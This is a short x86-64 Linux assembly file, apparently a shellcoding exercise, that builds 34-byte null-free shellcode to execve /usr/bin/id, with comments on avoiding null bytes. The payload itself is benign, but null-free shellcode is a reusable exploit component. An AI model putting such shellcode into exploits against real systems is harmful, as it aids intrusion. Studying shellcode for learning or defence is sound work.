// execve("/usr/bin/id") shellcode for linux64
// dan.dsod@gmail.com 
// compile:
// as execve_id.s -o execve_id.o
// ld execve_id.o -o execve_id
// 34 bytes long..
// see test.c  for shellcoding tester..

.section .text
.globl _start
_start:
	push   $0x3b
	pop    %rax
	cltd			// cheap asm golfing to 0 rdx..
	push %rdx
	// lets push /usr/bin/id into rdi in 2 parts and
	// avoid nulls.. to do this we use
	// //bin/id = 64692f6e69622f2f
	// /////usr = 7273752f2f2f2f2f
	movabs $0x64692f6e69622f2f, %rdi
	push %rdi
	movabs $0x7273752f2f2f2f2f, %rdi
	push %rdi
	push %rsp
	pop %rdi
	xor %rsi, %rsi			// null out rsi reg..
	syscall
